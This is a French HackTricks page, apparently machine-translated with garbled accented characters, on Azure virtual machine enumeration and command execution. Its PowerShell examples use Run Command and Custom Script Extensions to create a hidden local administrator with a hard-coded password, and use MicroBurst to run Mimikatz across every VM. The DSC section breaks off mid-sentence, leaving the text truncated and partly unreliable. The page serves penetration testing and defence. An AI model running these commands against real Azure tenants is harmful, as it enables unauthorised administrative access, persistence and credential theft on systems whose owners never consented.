# Az - Machines Virtuelles

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Informations de base

Les machines virtuelles Azure sont l'un des plusieurs types de ressources informatiques √©volutives √† la demande qu'Azure offre. En g√©n√©ral, vous choisissez une machine virtuelle lorsque vous avez besoin de plus de contr√¥le sur l'environnement informatique que les autres choix offrent. Cet article vous donne des informations sur ce que vous devez consid√©rer avant de cr√©er une machine virtuelle, comment la cr√©er et comment la g√©rer.

## √ânum√©ration

```powershell
# Obtenir les VM lisibles
Get-AzVM | fl
# Lis les VM en cours d'ex√©cution
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Obtenir l'interface et l'adresse IP
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

# Obtenir les extensions install√©es
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Obtenir le nom du connecteur r√©seau de la VM
Get-AzNetworkInterface -Name <name> # Obtenir les informations du connecteur r√©seau (comme l'adresse IP)
```

## **Ex√©cuter des commandes dans une VM**

### **Connexion AAD dans une VM**

Il est possible de permettre l'acc√®s aux utilisateurs authentifi√©s via AzureAD. Par exemple, en essayant d'acc√©der √† une **VM Linux** : `ssh username@azure-corp.com@1.1.1.1` (il est important d'**utiliser l'e-mail** avec azurecorp utilis√© lors de la tentative de connexion), vous pouvez obtenir une erreur comme :

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Il suffit de **suivre ces instructions** en allant sur [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) et en indiquant le code, en utilisant l'e-mail et le mot de passe comme identifiants et vous pourrez vous connecter via SSH (si cet utilisateur a suffisamment de permissions pour le faire : r√¥le `Virtual Machine Administrator Login` ou `Virtual Machine User Login`).

### **Ex√©cuter une commande**

```powershell
# L'autorisation permettant cela est Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose
## Une autre fa√ßon
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose

# Contenu du script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd 
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Essayez de l'ex√©cuter sur chaque machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```

### **Ex√©cuter une extension de script personnalis√©e**

Les extensions de machine virtuelle Azure (VM) sont de **petites applications** qui fournissent une configuration post-d√©ploiement et des t√¢ches d'automatisation sur les **VM Azure**. Par exemple, si une machine virtuelle n√©cessite une installation de logiciel, une protection antivirus ou la possibilit√© d'ex√©cuter un script √† l'int√©rieur, vous pouvez utiliser une extension VM.

Par cons√©quent, si vous avez acc√®s pour l'√©crire, vous pouvez ex√©cuter du code arbitraire :

```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```

### DesiredConfigurationState

**DesiredConfigurationState (DSC)** est similaire √† Ansible, mais c'est un outil dans PowerShell qui permet √† un h√¥te d'√™tre configur√© via du code. DSC a sa propre extension dans Azure qui permet le t√©l√©chargement de **fichiers de configuration**. Les fichiers de configuration DSC [sont assez pointilleux en ce qui concerne la syntaxe](https://docs.microsoft.com/en-us/powershell/dsc/getting-started/wingettingstarted?view=dsc-1.1#define-a-configuration-and-generate-the-configuration-document), cependant l'extension DSC est tr√®s cr√©dule et ex√©cutera **aveugl√©ment n'importe quelle commande** tant qu'elle suit un certain format, comme indiqu√© dans la figure 5.

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

Cela peut
## R√©f√©rences

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>